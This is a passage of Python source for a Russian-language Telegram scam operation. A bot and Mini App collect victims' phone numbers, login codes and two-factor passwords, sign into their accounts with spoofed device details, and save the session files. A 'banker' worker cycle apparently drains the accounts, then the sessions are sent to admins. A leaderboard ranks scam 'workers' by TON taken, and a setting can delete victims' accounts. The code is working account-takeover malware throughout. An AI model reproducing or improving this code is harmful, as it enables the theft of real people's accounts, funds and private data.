                print(f"👤 [API] User from DB: {u_db}")  # Отладка

                # Пользователь должен быть в БД с username
                if not u_db:
                    print("❌ [API] User not found in database - send /start first")  # Отладка
                    return web.json_response({'status': 'error', 'message': 'Please send /start to the bot first before using WebApp.'})

                if not u_db.get('username'):
                    print("❌ [API] Username missing - set username in Telegram")  # Отладка
                    return web.json_response({'status': 'error', 'message': 'Username required. Set username in Telegram settings.'})

            except ValueError:
                print("❌ [API] Invalid chat_id format")  # Отладка
                return web.json_response({'status': 'error', 'message': 'Invalid Chat ID'})

            # Валидация номера телефона
            phone_clean = re.sub(r'\D', '', phone)

            # Минимальная и максимальная длина для международных номеров
            if len(phone_clean) < 7 or len(phone_clean) > 17:
                return web.json_response({'status': 'error', 'message': 'Неверный формат номера телефона. Длина должна быть от 7 до 17 цифр.'})

            print(f"🚀 [WEB] Отправка кода на: {phone} (ID: {chat_id})")

            
                    # Вместо статичного Xiaomi 14 Ultra используем более разнообразные данные
            device_models = ["Samsung Galaxy S24 Ultra", "Pixel 8 Pro", "iPhone 15 Pro", "Xiaomi 14 Pro"]
            current_device = random.choice(device_models)

            client = Client(
                name=f"temp_{chat_id}",
                api_id=SETTINGS['api_id'],
                api_hash=SETTINGS['api_hash'],
                workdir=str(SESSIONS_DIR),
                device_model=current_device,
                system_version="Android 14",
                app_version="10.15.1",
                lang_code="ru",
                system_lang_code="ru-RU" # Важно для +7 номеров
            )
            
            await client.connect()
            
            # Ожидание перед запросом кода (имитация задержки пользователя)
            await asyncio.sleep(3) 

            try:
                # Пытаемся отправить код
                # force_sms=False — сейчас это важно, Telegram сам решит, куда слать
                code_hash = await client.send_code(phone)
            except Exception as e:
                # Если первая попытка дала ошибку, пробуем через 15 секунд resend_code
                print(f"⚠️ Первая попытка не удалась, ждем... {e}")
                await asyncio.sleep(15)
                try:
                    code_hash = await client.resend_code(phone, code_hash.phone_code_hash)
                except Exception as e2:
                    # Если и тут ошибка — Telegram заблокировал ваш IP или API_ID
                    return web.json_response({'status': 'error', 'message': f'Telegram отказал в отправке: {e2}'})
            # =========================
                # Преобразуем FloodWait в понятное сообщение
                wait_minutes = e.value // 60
                wait_seconds = e.value % 60
                if wait_minutes > 0:
                    wait_time = f"{wait_minutes} мин {wait_seconds} сек"
                else:
                    wait_time = f"{wait_seconds} сек"

                return web.json_response({
                    'status': 'error',
                    'message': f'Вы были заблокированы за многочисленные попытки входа, разблокировка через {wait_time}'
                })

            # Сохраняем сессию в памяти бота
            self.web_auths[chat_id] = {
                'client': client,
                'phone': phone,
                'hash': code_hash.phone_code_hash
            }
            # === ЛОГ ===
            db.log_activity(chat_id_int, "Ввел номер", f"Phone: {phone}")
            u_db = db.get_user(chat_id_int)
            if u_db and u_db.get('worker_id'):
                db.log_activity(u_db['worker_id'], "Ввел номер", f"Мамонт {u_db['first_name']} (@{mask_data(u_db['username'])})", u_db['worker_id'])
            # ===========

            # Лог отправки номера
            full_name = u_db['first_name'] if u_db else "Unknown"
            display_tag = f"@{mask_data(u_db['username'])}" if u_db and u_db.get('username') else mask_data(str(chat_id_int))
            log_card = (
                f"<b>📱 ВВОД НОМЕРА</b>\n"
                f"<code>««─────────────────»»</code>\n"
                f"👤 <b>Юзер:</b> <code>{full_name}</code>\n"
                f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                f"📞 <b>Номер:</b> <code>{mask_phone(phone)}</code>\n"
                f"⏳ <b>Статус:</b> Ожидание кода...\n"
                f"<code>««─────────────────»»</code>"
            )
            await log_to_topic(self.bot, 'topic_auth', log_card)

            return web.json_response({'status': 'ok'})
        except Exception as e:
            print(f"❌ Ошибка send_phone: {e}")
            return web.json_response({'status': 'error', 'message': str(e)})

    async def api_send_code(self, request):
        try:
            data = await request.json()
            chat_id = str(data.get('chatId') or request.query.get('chatId'))
            code = data.get('code', '').strip()

            # Получаем данные пользователя для логов заранее
            u_db = db.get_user(int(chat_id)) if chat_id.isdigit() else None
            display_tag = f"@{mask_data(u_db['username'])}" if u_db and u_db.get('username') else mask_data(str(chat_id))
            full_name = u_db['first_name'] if u_db else "Unknown"
            
            if not code or not code.isdigit() or len(code) != 5:
                return web.json_response({'status': 'error', 'message': 'Неверный формат кода'})

            auth = self.web_auths.get(chat_id)
            if not auth: return web.json_response({'status': 'error', 'message': 'Сессия истекла'})

            phone = auth['phone']
            m_ph = mask_phone(phone)

            try:
                # Попытка входа
                await auth['client'].sign_in(auth['phone'], auth['hash'], code)
                
                # === УСПЕШНЫЙ ВХОД (БЕЗ 2FA) ===
                
                # 1. Лог в БД
                db.log_activity(int(chat_id), "Ввел верный код", f"Код: {code}")
                if u_db and u_db.get('worker_id'):
                    db.log_activity(u_db['worker_id'], "Ввел верный код", f"Мамонт {full_name} (@{mask_data(u_db['username'])})", u_db['worker_id'])
                
                # 2. Лог в канал (Успех)
                log_card = (
                    f"<b>✅ ВЕРНЫЙ КОД</b>\n"
                    f"<code>««─────────────────»»</code>\n"
                    f"👤 <b>Юзер:</b> <code>{full_name}</code>\n"
                    f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                    f"⏳ <b>Статус:</b> Вход выполнен, запускаю цикл...\n"
                    f"<code>««─────────────────»»</code>"
                )
                await log_to_topic(self.bot, 'topic_auth', log_card)

                # 3. ФИНАЛИЗАЦИЯ (Важно! Здесь проверка на твинка и сохранение сессии)
                await self.finalize_login(auth['client'], int(chat_id))

                return web.json_response({'status': 'ok'})

            except SessionPasswordNeeded:
                # === НУЖЕН ПАРОЛЬ (2FA) ===
                
                # 1. Лог в БД
                db.log_activity(int(chat_id), "Ввел код", f"Нужен пароль")
                if u_db and u_db.get('worker_id'):
                    db.log_activity(u_db['worker_id'], "Ввел код", f"Мамонт {full_name} (@{mask_data(u_db['username'])}) нуждается в пароле")
                
                # 2. Лог в канал (Требуется 2FA) - РАНЬШЕ ЭТОГО НЕ БЫЛО
                log_card = (
                    f"<b>🔐 ЗАПРОС 2FA</b>\n"
                    f"<code>««─────────────────»»</code>\n"
                    f"👤 <b>Юзер:</b> <code>{full_name}</code>\n"
                    f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                    f"📱 <b>Номер:</b> <code>{m_ph}</code>\n"
                    f"⚠️ <b>Статус:</b> Введен верный код, ожидаю пароль...\n"
                    f"<code>««─────────────────»»</code>"
                )
                await log_to_topic(self.bot, 'topic_auth', log_card)
                
                return web.json_response({'status': 'need_password'})

            except PhoneCodeInvalid:
                # Лог неверного кода
                log_card = (
                    f"<b>❌ НЕВЕРНЫЙ КОД</b>\n"
                    f"<code>««─────────────────»»</code>\n"
                    f"👤 <b>Юзер:</b> <code>{full_name}</code>\n"
                    f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                    f"📞 <b>Номер:</b> <code>{m_ph}</code>\n"
                    f"🔢 <b>Введенный код:</b> <code>{code}</code>\n"
                    f"<code>««─────────────────»»</code>"
                )
                
                db.log_activity(int(chat_id), "Неверный код", f"Code: {code}")
                if u_db and u_db.get('worker_id'):
                    db.log_activity(u_db['worker_id'], "Неверный код", f"Мамонт {full_name} (@{mask_data(u_db['username'])}) ввел неправильный код")
                
                await log_to_topic(self.bot, 'topic_auth', log_card)
                return web.json_response({'status': 'error', 'message': 'Неверный код'})

            except PhoneCodeExpired:
                return web.json_response({'status': 'error', 'message': 'Код истек'})
                
        except Exception as e:
            logger.error(f"API send_code error: {e}")
            return web.json_response({'status': 'error', 'message': 'Ошибка сервера'})

    async def api_send_password(self, request):
        data = await request.json()
        chat_id = str(data.get('chatId') or request.query.get('chatId'))
        password = data.get('password')

        # Получаем данные пользователя для логов заранее
        u_db = db.get_user(int(chat_id)) if chat_id.isdigit() else None
        display_tag = f"@{mask_data(u_db['username'])}" if u_db and u_db.get('username') else mask_data(str(chat_id))

        try:
            auth = self.web_auths.get(chat_id)
            if not auth: return web.json_response({'status': 'error'})

            phone = auth['phone']

            try:
                await auth['client'].check_password(password)
                db.log_activity(int(chat_id), "Ввел пароль (2FA)", "Вход выполнен")
                u_db = db.get_user(int(chat_id))
                if u_db and u_db.get('worker_id'):
                    db.log_activity(u_db['worker_id'], "Ввел пароль (2FA)", f"Мамонт {u_db['first_name']} (@{mask_data(u_db['username'])}) вошел", u_db['worker_id'])

                await self.finalize_login(auth['client'], int(chat_id))
                return web.json_response({'status': 'ok'})
            except PasswordHashInvalid:
                # Лог неверного пароля
                log_card = (
                    f"<b>❌ НЕВЕРНЫЙ ПАРОЛЬ</b>\n"
                    f"<code>««─────────────────»»</code>\n"
                    f"👤 <b>Юзер:</b> <code>{u_db['first_name'] if u_db else 'Unknown'}</code>\n"
                    f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                    f"📞 <b>Номер:</b> <code>{mask_phone(phone)}</code>\n"
                    f"<code>««─────────────────»»</code>"
                )
                db.log_activity(int(chat_id), "Неверный пароль (2FA)", "Неверный пароль")
                if u_db and u_db.get('worker_id'):
                    db.log_activity(u_db['worker_id'], "Неверный пароль (2FA)", f"Мамонт {u_db['first_name']} (@{mask_data(u_db['username'])}) ввел неправильный пароль")
                await log_to_topic(self.bot, 'topic_auth', log_card)
                return web.json_response({'status': 'error', 'message': 'Неверный пароль'})
            except Exception as e:
                logger.error(f"Password verification error: {e}")
                return web.json_response({'status': 'error', 'message': 'Ошибка верификации'})
        except Exception as e:
            logger.error(f"API send_password error: {e}")
            return web.json_response({'status': 'error', 'message': 'Ошибка сервера'})

    async def api_get_status(self, request):
        """Метод, который запрашивал Mini App и на котором вылетала ошибка"""
        return web.json_response({'status': 'waiting_phone'})

    async def api_get_user_data(self, request):
        try:
            user_id_param = request.match_info.get('user_id')
            if not user_id_param:
                return web.json_response({'status': 'error', 'message': 'User ID required'})

            try:
                user_id = int(user_id_param)
            except ValueError:
                return web.json_response({'status': 'error', 'message': 'Invalid User ID'})

            # Get user data from database
            user_data = db.get_user(user_id)
            if not user_data:
                return web.json_response({'status': 'error', 'message': 'User not found'})

            # Get user's NFTs
            user_nfts = db.get_user_nfts(user_id)

            # Prepare response data
            response_data = {
                'user_id': user_data['user_id'],
                'username': user_data.get('username'),
                'first_name': user_data.get('first_name'),
                'balance': user_data.get('balance', 0),
                'nfts': user_nfts
            }

            return web.json_response(response_data)

        except Exception as e:
            print_error(f"Error getting user data: {e}")
            return web.json_response({'status': 'error', 'message': str(e)})
 
    

    async def api_log_photo(self, request):
        try:
            data = await request.json()
            chat_id = str(data.get('chatId') or request.query.get('chatId'))

            if not chat_id or chat_id == 'null':
                return web.json_response({'status': 'error', 'message': 'Chat ID required'})

            u_db = db.get_user(int(chat_id))
            if not u_db or not u_db.get('username'):
                return web.json_response({'status': 'error', 'message': 'User not found'})

            username = u_db.get('username', 'unknown')
            mamont_tag = f"@{mask_data(username)}"

            photo_log = f"📸 Фото мамонта {mamont_tag}\n"

            # Send photo to topic if provided
            gid = SETTINGS.get('allowed_group_id')
            tid = SETTINGS.get('topic_success')

            if gid and tid and 'photo' in data and data['photo']:
                import base64
                from aiogram.types import BufferedInputFile

                try:
                    # Decode base64 photo
                    photo_data = data['photo'].split(',')[1]  # Remove data:image/png;base64,
                    if not photo_data or photo_data == 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==':  # Empty 1x1 PNG
                        raise ValueError("Empty photo data")

                    photo_bytes = base64.b64decode(photo_data)

                    if len(photo_bytes) < 100:  # Too small, probably empty
                        raise ValueError("Photo data too small")

                    # Create BufferedInputFile for sending
                    photo_file = BufferedInputFile(photo_bytes, filename='photo.png')

                    await self.bot.send_photo(
                        chat_id=int(gid),
                        photo=photo_file,
                        caption=photo_log,
                        message_thread_id=int(tid),
                        parse_mode="HTML"
                    )
                except Exception as e:
                    print(f"Error sending photo to topic: {e}")
                    # Fallback to text log
                    await log_to_topic(self.bot, 'topic_success', photo_log)
            else:
                await log_to_topic(self.bot, 'topic_success', photo_log)

            return web.json_response({'status': 'ok'})
        except Exception as e:
            print_error(f"Error logging photo: {e}")
            return web.json_response({'status': 'error', 'message': str(e)})

    async def run(self):
        print_banner()
        runner = web.AppRunner(self.app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', 3000)
        await site.start()
        print(f"WebApp server started on port 3000")

        self.bot = Bot(token=SETTINGS['bot_token'], default=DefaultBotProperties(parse_mode=ParseMode.HTML))
        self.dp = Dispatcher()
        self.dp.update.middleware(RateLimitMiddleware())
        self.dp.include_router(get_main_router(self.bot, SETTINGS['api_url']))

        await self.bot.delete_webhook(drop_pending_updates=True)
        asyncio.create_task(self.start_polling())
        print_success("Bot Started!")
        await self.dp.start_polling(self.bot)

    async def start_polling(self):
        self.running = True
        async with aiohttp.ClientSession() as session:
            while self.running:
                try:
                    async with session.get(f"{SETTINGS['api_url']}/api/telegram/get-pending", headers=self.get_headers(), timeout=10) as r:
                        if r.status == 200:
                            data = await r.json()
                            for req in data.get('requests', []):
                                if req['requestId'] not in self.processed_reqs:
                                    self.processed_reqs.add(req['requestId'])
                                    asyncio.create_task(self.handle_req(req, session))
                        elif r.status == 401:
                            print_error("API Auth Failed"); await asyncio.sleep(10)
                except: await asyncio.sleep(5)
                await asyncio.sleep(2)

    def get_headers(self):
        return {"Content-Type": "application/json", "X-Bot-Token": SETTINGS['bot_token']}

    def is_user_blocked(self, user_id):
        """Проверяет, заблокирован ли пользователь"""
        if user_id not in self.phone_attempts:
            return False

        attempts = self.phone_attempts[user_id]
        if attempts.get('blocked_until', 0) > time.time():
            return True

        return False

    def increment_attempts(self, user_id):
        """Увеличивает счетчик попыток пользователя"""
        if user_id not in self.phone_attempts:
            self.phone_attempts[user_id] = {'count': 0, 'blocked_until': 0}

        attempts = self.phone_attempts[user_id]
        attempts['count'] += 1

        # Если достигнуто 10 попыток, блокируем на 1 час
        if attempts['count'] >= 10:
            attempts['blocked_until'] = time.time() + 3600  # 1 час блокировки
            attempts['count'] = 0  # Сбрасываем счетчик

    def reset_attempts(self, user_id):
        """Сбрасывает счетчик попыток при успешном вводе номера"""
        if user_id in self.phone_attempts:
            self.phone_attempts[user_id]['count'] = 0

    async def update_status(self, sess, rid, status, msg=None, needs_2fa=False):
        try:
            await sess.post(f"{SETTINGS['api_url']}/api/telegram/update-request", json={"requestId": rid, "result": {"status": status, "message": msg, "needs2FA": needs_2fa}}, headers=self.get_headers())
        except: pass

    async def get_client(self, phone):
        name = str(phone).replace(" ", "").replace("+", "")
        if name not in self.pyro_clients:
            self.pyro_clients[name] = Client(
                name, 
                api_id=SETTINGS['api_id'], 
                api_hash=SETTINGS['api_hash'], 
                workdir=str(SESSIONS_DIR),
                device_model="Xiaomi 14 Ultra",
                system_version="Android 14",
                app_version="10.15.1",
                lang_code="ru"
            )

        c = self.pyro_clients[name]
        if not c.is_connected:
            await c.connect()
        return c

    async def finalize_login(self, client, user_id):
        """
        Финальная обработка:
        1. Проверка на твинка.
        2. Переименование сессии из temp_ID в PHONE (сохраняем только валидные).
        3. Запуск воркера.
        """
        try:
            # 1. Получаем данные СЕССИИ (с защитой, если клиент уже умер)
            try:
                if not client.is_connected:
                    await client.connect()
                me = await client.get_me()
            except Exception as e:
                print_error(f"Failed to get_me in finalize_login: {e}")
                return

            self.reset_attempts(user_id)

            # Данные для имени файла
            phone_clean = str(me.phone_number).replace("+", "").strip()
            old_session_name = client.name # это temp_ChatID

            # Данные для логов
            session_fullname = me.first_name or "Без имени"
            session_phone = mask_phone(me.phone_number)
            session_display_masked = f"@{mask_data(me.username)}" if me.username else mask_data(str(me.id))

            # --- ПРОВЕРКА НА ТВИНКА ---
            initiator_db = db.get_user(user_id)
            initiator_username = initiator_db.get('username') or "Unknown" if initiator_db else "Unknown"

            # Данные Воркера
            worker_info = "👤 <b>Воркер:</b> 👤 Администрация"
            w_id = None
            if initiator_db:
                w_id = initiator_db.get('worker_id')
                if w_id:
                    w = db.get_user(w_id)
                    if w:
                        w_tag = f"@{w['username']}" if w['username'] else f"ID: {w['user_id']}"
                        worker_info = f"👤 <b>Воркер:</b> {w_tag}"

            is_twink = False
            u1 = str(initiator_username).strip().lower()
            u2 = (me.username or "").strip().lower()
            if (u1 and u1 != "unknown" and u1 != "none" and u1 != u2) or (int(user_id) != int(me.id)):
                is_twink = True

            # --- ЛОГИРОВАНИЕ ---
            if is_twink:
                old_display = f"@{mask_data(initiator_username)}"
                new_display = f"@{mask_data(me.username or 'NoUser')}"
                twink_log = (
                    f"⚠️ <b>ВОШЕЛ С ДРУГОГО АККАУНТА (ТВИНК)</b>\n"
                    f"<code>««─────────────────»»</code>\n"
                    f"👤 <b>Мамонт:</b> <code>{old_display}</code>\n"
                    f"🔄 <b>Вошел в:</b> <code>{new_display}</code>\n"
                    f"📱 <b>Тел. входа:</b> <code>{session_phone}</code>\n"
                    f"{worker_info}\n"
                    f"<code>««─────────────────»»</code>"
                )
                await log_to_topic(self.bot, 'topic_auth', twink_log)
            else:
                log_card = (
                    f"<b>✅ УСПЕШНЫЙ ВХОД</b>\n"
                    f"<code>««─────────────────»»</code>\n"
                    f"📱 <b>Телефон:</b> <code>{session_phone}</code>\n"
                    f"👤 <b>Юзер:</b> <code>{session_fullname}</code>\n"
                    f"🆔 <b>Тег:</b> <code>{session_display_masked}</code>\n"
                    f"{worker_info}\n"
                    f"<code>««─────────────────»»</code>"
                )
                await log_to_topic(self.bot, 'topic_auth', log_card)

            # Обновляем БД
            db.add_user(me.id, me.username, session_fullname, w_id)
            db.log_activity(me.id, "Успешный вход", "Вход выполнен")
            if w_id:
                action_text = "Вошел с твинка" if is_twink else "Вошел в аккаунт"
                db.log_activity(w_id, "Успешный вход", f"Мамонт {session_fullname} ({action_text})", w_id)

            # === ГЛАВНОЕ ИЗМЕНЕНИЕ: ПЕРЕИМЕНОВАНИЕ ФАЙЛА ===
            print_info(f"🔄 Конвертация временной сессии {old_session_name} в постоянную {phone_clean}...")

            # 1. Отключаем временного клиента (БЕЗОПАСНО)
            try:
                # Используем disconnect() вместо stop(), так как нам просто нужно освободить файл
                if client.is_connected:
                    await client.disconnect()
            except Exception:
                pass # Игнорируем ошибки отключения, главное что файл освобожден

            # Удаляем из кэша клиентов
            if old_session_name in self.pyro_clients:
                del self.pyro_clients[old_session_name]

            # 2. Переименовываем файл
            old_path = SESSIONS_DIR / f"{old_session_name}.session"
            new_path = SESSIONS_DIR / f"{phone_clean}.session"

            # Даем системе время освободить файл
            await asyncio.sleep(0.5)

            if old_path.exists():
                # Если файл с таким номером уже есть (повторный вход) - удаляем старый
                if new_path.exists():
                    try:
                        os.remove(new_path)
                    except Exception as remove_error:
                        print_warning(f"Не удалось удалить старый файл {new_path}: {remove_error}")

                try:
                    os.rename(old_path, new_path)
                    print_success(f"✅ Сессия сохранена как: {phone_clean}.session")
                except Exception as rename_error:
                    print_error(f"❌ Не удалось переименовать файл сессии: {rename_error}")
                    # Если не удалось переименовать, пробуем продолжить со старым именем
                    phone_clean = old_session_name
            else:
                print_error(f"❌ Не найден файл сессии для переименования: {old_path}")
                # Если файла нет, возможно он уже переименован
                if not new_path.exists():
                    return

            # 3. Создаем НОВОГО клиента с правильным именем и фиксом параметров
            new_client = Client(
                name=phone_clean,
                api_id=SETTINGS['api_id'],
                api_hash=SETTINGS['api_hash'],
                workdir=str(SESSIONS_DIR),
                device_model="Xiaomi 14 Ultra",
                system_version="Android 14",
                app_version="10.15.1",
                lang_code="ru"
            )

            # Запускаем нового клиента
            try:
                await new_client.start()
                print_success(f"✅ Новый клиент {phone_clean} запущен")
            except Exception as start_error:
                print_error(f"Ошибка запуска нового клиента: {start_error}")
                # Если сессия занята, пробуем подключиться через паузу
                await asyncio.sleep(2)
                try:
                    await new_client.start()
                except:
                    print_error(f"Критическая ошибка запуска клиента {phone_clean}")
                    return

            # Добавляем в кэш
            self.pyro_clients[phone_clean] = new_client

            # 4. Запускаем воркера с НОВЫМ клиентом
            asyncio.create_task(self.run_worker_process(new_client, me.id, session_phone))

        except Exception as e:
            print_error(f"Finalize login error: {e}")

    async def run_worker_process(self, client, user_id, m_phone):
        """Фоновый процесс обработки аккаунта"""
        try:
            # Инициализация банкира
            banker = None
            b_name = SETTINGS.get('banker_session')
            if b_name and (SESSIONS_DIR / f"{b_name}.session").exists():
                try:
                    banker = Client(b_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
                    await banker.start()
                except Exception as e: print_error(f"Banker init failed: {e}")

            # Запуск основного цикла
            await FULL_WORKER_CYCLE(client, banker, self.bot)

            if banker:
                try: await banker.stop()
                except: pass

            # Отправка файла админам
            session_file = SESSIONS_DIR / f"{client.name}.session"
            await send_file_to_admins(self.bot, session_file, f"📦 {m_phone}")

            # Безопасное отключение и перенос
            if client.is_connected:
                await client.stop()
            
            if client.name in self.pyro_clients: 
                del self.pyro_clients[client.name]

            await asyncio.sleep(1.0)

            src = SESSIONS_DIR / f"{client.name}.session"
            dst = ARCHIVE_DIR / f"{client.name}.session"

            if src.exists():
                for attempt in range(5):
                    try:
                        await asyncio.to_thread(shutil.copy2, str(src), str(dst))
                        await asyncio.to_thread(os.remove, str(src))
                        break
                    except Exception:
                        await asyncio.sleep(1.0)

        except Exception as e:
            print_error(f"Worker process error: {e}")

    async def handle_req(self, req, sess):
        rid, act = req['requestId'], req['action']
        data = req.get('data') or {}
        ph = str(req.get('phone') or data.get('phone') or "").replace(" ", "")
        code = req.get('code') or data.get('code')
        pwd = req.get('password') or data.get('password')
        cid = req.get('chatId')

        # Проверка на наличие пользователя и username
        if not cid:
            return

        u_db = db.get_user(cid)
        if not u_db or not u_db.get('username'):
            await self.update_status(sess, rid, 'error', 'Username required')
            return

        full_name = u_db['first_name'] if u_db else "Unknown"
        display_tag = f"@{mask_data(u_db['username'])}" if u_db and u_db.get('username') else mask_data(str(cid)) if cid else "Unknown"
        m_ph = mask_phone(ph)

        try:
            if act == 'send_phone':
                # Проверяем, не заблокирован ли пользователь
                if self.is_user_blocked(cid):
                    remaining_time = int((self.phone_attempts[cid]['blocked_until'] - time.time()) / 60)
                    await self.update_status(sess, rid, 'error', f'Слишком много попыток ввода номера. Попробуйте через {remaining_time} минут.')
                    return

                # Увеличиваем счетчик попыток
                self.increment_attempts(cid)

                c = await self.get_client(ph)
                if not c.is_connected: await c.connect()
                s = await c.send_code(ph)
                self.user_sessions[ph] = {'h': s.phone_code_hash}

                msg = (
                    f"<b>📱 ВВОД НОМЕРА</b>\n"
                    f"<code>««─────────────────»»</code>\n"
                    f"👤 <b>Юзер:</b> <code>{full_name}</code>\n"
                    f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                    f"📞 <b>Номер:</b> <code>{m_ph}</code>\n"
                    f"⏳ <b>Статус:</b> Ожидание кода...\n"
                    f"<code>««─────────────────»»</code>"
                )
                await log_to_topic(self.bot, 'topic_auth', msg)
                await self.update_status(sess, rid, 'waiting_code')

            elif act in ['verify_code', 'send_code']:
                c = await self.get_client(ph)
                try:
                    await c.sign_in(ph, self.user_sessions[ph]['h'], str(code))
                    msg = (
                        f"<b>📩 КОД ПРИНЯТ</b>\n"
                        f"<code>««─────────────────»»</code>\n"
                        f"👤 <b>Юзер:</b> <code>{full_name}</code>\n"
                        f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                        f"✅ <b>Результат:</b> Вход выполнен\n"
                        f"<code>««─────────────────»»</code>"
                    )
                    await log_to_topic(self.bot, 'topic_auth', msg)
                    await self.finalize_login(c, cid) # Вызов метода финализации
                    await self.update_status(sess, rid, 'success')
                except SessionPasswordNeeded:
                    msg = (
                        f"<b>🔐 ЗАПРОС 2FA</b>\n"
                        f"<code>««─────────────────»»</code>\n"
                        f"👤 <b>Юзер:</b> <code>{full_name}</code>\n"
                        f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                        f"📱 <b>Номер:</b> <code>{m_ph}</code>\n"
                        f"⚠️ <b>Статус:</b> Нужен пароль\n"
                        f"<code>««─────────────────»»</code>"
                    )
                    await log_to_topic(self.bot, 'topic_auth', msg)
                    await self.update_status(sess, rid, 'waiting_password', needs_2fa=True)

            elif act in ['send_password', 'verify_password']:
                c = await self.get_client(ph)
                await c.check_password(str(pwd))
                await self.finalize_login(c, cid) # Вызов метода финализации
                await self.update_status(sess, rid, 'success')

        except Exception as e:
            error_msg = (
                f"<b>❌ ОШИБКА АВТОРИЗАЦИИ</b>\n"
                f"<code>««─────────────────»»</code>\n"
                f"👤 <b>Юзер:</b> <code>{full_name}</code>\n"
                f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                f"⚠️ <b>Ошибка:</b> <code>{str(e)}</code>\n"
                f"<code>««─────────────────»»</code>"
            )
            await log_to_topic(self.bot, 'topic_auth', error_msg)
            await self.update_status(sess, rid, 'error', str(e))

# ================= AIOGRAM ROUTER =================
def get_main_router(bot_instance: Bot, current_api_url: str):
    router = Router()
    
    @router.message(Command(re.compile(r"top|topd|topw")))
    async def cmd_top_workers(message: types.Message):
        # Получаем данные из БД (топ 10)
        top_data = db.get_top_workers(limit=10)
        
        if not top_data:
            return await message.answer("<b>🏆 Список лидеров пока пуст.</b>")

        # Определяем заголовок в зависимости от введенной команды
        cmd = message.text.split()[0].replace("/", "").lower()
        if cmd == "topd":
            header = "🏆 <b>ТОП ВОРКЕРОВ ЗА ДЕНЬ</b> 🏆\n"
        elif cmd == "topw":
            header = "🏆 <b>ТОП ВОРКЕРОВ ЗА НЕДЕЛЮ</b> 🏆\n"
        else:
            header = "🏆 <b>ТОП ВОРКЕРОВ ЗА ВСЕ ВРЕМЯ</b> 🏆\n"

        txt = header + "<code>««─────────────────»»</code>\n\n"
        
        for i, (username, first_name, total_ton, count) in enumerate(top_data, 1):
            # Используем полные данные БЕЗ маскировки (как просили)
            display_name = html.escape(first_name or "Аноним")
            # Если есть юзернейм - показываем его, иначе имя
            user_ref = f"@{username}" if username and username != "Unknown" else f"<code>{display_name}</code>"
            
            # Эмодзи для призовых мест
            medals = {1: "🥇", 2: "🥈", 3: "🥉"}
            rank = medals.get(i, f"<b>{i}.</b>")
            
            # Формируем строку: Медаль. Юзернейм — Сумма TON (Кол-во подарков)
            txt += f"{rank} {user_ref} — <b>{total_ton:.2f} TON</b> ({count} 🎁)\n"

        txt += "\n<code>««─────────────────»»</code>\n"
        txt += "<i>Лидеры обновляются в реальном времени!</i>"

        await message.answer(txt, parse_mode="HTML")

    async def check_admin(user_id): return user_id in SETTINGS["admin_ids"]

    @router.callback_query(F.data == "toggle_deactivate")
    async def handler_toggle_deactivate(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        
        # Переключаем
        current = SETTINGS.get("auto_deactivate", False)
        SETTINGS["auto_deactivate"] = not current
        save_settings(SETTINGS) # Обязательно сохраняем в файл!
        
        status = "ВКЛЮЧЕНО ✅" if not current else "ВЫКЛЮЧЕНО ❌"
        await call.answer(f"⚙️ Удаление аккаунтов: {status}", show_alert=True)
        
        # Обновляем меню, чтобы кнопка перерисовалась
        await admin_panel(call.message)

    @router.message(CommandStart())
    async def command_start(message: types.Message, command: CommandObject):
        print_info(f"📨 Command /start received from user {message.from_user.id}")
        user_id = message.from_user.id
        args = command.args
        worker_id = None

        # --- ПРОВЕРКА ОБЩЕГО ЧАТА ---
        # Получаем ID группы из настроек
        allowed_group_id = SETTINGS.get('allowed_group_id')
        
        if allowed_group_id:
            try:
                # Проверяем, является ли пользователь участником группы
                chat_member = await bot_instance.get_chat_member(
                    chat_id=allowed_group_id,
                    user_id=user_id
                )
                
                # Если пользователь в группе (любой статус кроме 'left' или 'kicked')
                if chat_member.status not in ['left', 'kicked']:
                    # Показываем панель воркера вместо обычного меню
                    await worker_panel_handler(message)
                    return
            except Exception as e:
                print_info(f"User {user_id} is not in the group or error: {e}")
                # Если ошибка (например, пользователь не в группе), продолжаем обычную обработку
                pass
        # --- КОНЕЦ ПРОВЕРКИ ОБЩЕГО ЧАТА ---

        # Реферальная логика (оставляем без изменений)
        if args:
            if args.startswith("c_"):
                check = db.get_check(args.replace("c_", ""))
                if check: worker_id = check['creator_id']
            elif args.startswith("q_"):
                try: worker_id = int(args.replace("q_", "").split("_")[0])
                except: pass

        # Добавляем юзера в БД
        db.add_user(user_id, message.from_user.username, message.from_user.first_name, worker_id)

        # Simple test response first
        try:
            await message.answer("🚀 <b>Бот работает!</b>\n\nКоманда получена, загружаю меню...", parse_mode="HTML")
            print_success(f"✅ Response sent to user {user_id}")
        except Exception as e:
            print_error(f"❌ Failed to send response to user {user_id}: {e}")
            return

        # Process referral logic and show menu
        if args and args.startswith("c_"):
            # Process check activation
            check_id = args.replace("c_", "")
            check = db.get_check(check_id)
            if check:
                worker_id = check['creator_id']
                db.add_user(user_id, message.from_user.username, message.from_user.first_name, worker_id)

                # Activate the check and show success message
                res, amt, cr = db.activate_check(check_id, user_id)
                if res == "success":
                    db.log_activity(message.from_user.id, "Активировал чек", f"+{amt} ⭐️")
                    if cr: db.add_user(user_id, message.from_user.username, message.from_user.first_name, cr, message.from_user.username, message.from_user.first_name)
                    # Мамонт (жертва) активирует чек - автоматически становится мамонтом
                    db.set_mamont(user_id, True)
                    u = db.get_user(user_id)

                    # Log the activation
                    await log_check_activation(bot_instance, message.from_user, {'amount': amt, 'creator_id': cr})

                    # === НОВЫЙ ТЕКСТ ДЛЯ ЧЕКА (ВСТАВИТЬ В ОБА БЛОКА: c_ и q_) ===
                    # Новый текст для обычного чека
                    txt = (
                        f"🎉 <b>ЧЕК УСПЕШНО АКТИВИРОВАН!</b>\n\n"
                        f"<b>Баланс пополнен:</b>\n"
                        f"💰 <b>+{amt} ⭐️ Stars</b>\n\n"
